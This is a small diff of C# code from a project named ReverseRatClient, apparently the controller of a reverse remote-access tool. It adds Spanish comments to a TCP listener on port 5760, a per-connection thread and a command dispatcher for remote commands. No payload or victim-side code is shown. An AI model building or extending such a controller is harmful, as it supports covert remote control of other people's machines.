@@ -69,7 +69,7 @@ namespace ReverseRatClient
         private void StartListen()
         {
             Socket socketEx;
-            _tcpListener = new TcpListener(IPAddress.Any, 5760);
+            _tcpListener = new TcpListener(IPAddress.Any, 5760); //Inicia escucha de puertos en el 5760
             _tcpListener.Start();
             toolStripStatusLabel1.Text = @"Escuchando puerto 5760...";
             for (;;)
@@ -77,7 +77,8 @@ namespace ReverseRatClient
                 socketEx = _tcpListener.AcceptSocket();              
                 IPEndPoint ipend = (IPEndPoint)socketEx.RemoteEndPoint;
                 toolStripStatusLabel1.Text = @"Conexión de " + IPAddress.Parse(ipend.Address.ToString());                
-                _socketForServer = socketEx;              
+                _socketForServer = socketEx;            
+                  
                 // Thread nuevo para cada cliente conectado                       
                 _thRunClient = new Thread(RunClient);
                 _thRunClient.Start();              
@@ -143,8 +144,7 @@ namespace ReverseRatClient
 
                 }
                 else
-                {
-                   // var pnlControlref = new PanelDeControl();
+                {                   
                     for (int ctx = 0; ctx < ActiveForm.MdiChildren.Length; ctx++) // Salida global de comandos
                     {
                         if (Convert.ToString(ActiveForm.MdiChildren[ctx].Tag) == cadenaEvaluar)
@@ -168,8 +168,7 @@ namespace ReverseRatClient
                 }
                 Application.DoEvents();
                 strInput.Remove(0, strInput.Length);                
-            }
-            //CleanupGeneral();
+            }           
         }
 
 
@@ -458,6 +457,8 @@ namespace ReverseRatClient
 #endregion
 
 
+
+        // Despachador de comandos de la aplicacion, el usuario envia comando y  este es procesado en esta pequeña funcion
         private bool ProcesarComandosRat(StringBuilder cadena, Socket sck, out string s)
         {
             string[] ini;
@@ -624,7 +625,7 @@ namespace ReverseRatClient
             ListaCanales.Add("Manga-Anime");
             ListaCanales.Add("Hackers");
 
-            _thStartListen = new Thread(StartListen);
+            _thStartListen = new Thread(StartListen); // Servidor para chat
             _thStartListen.Start();   
         }
 
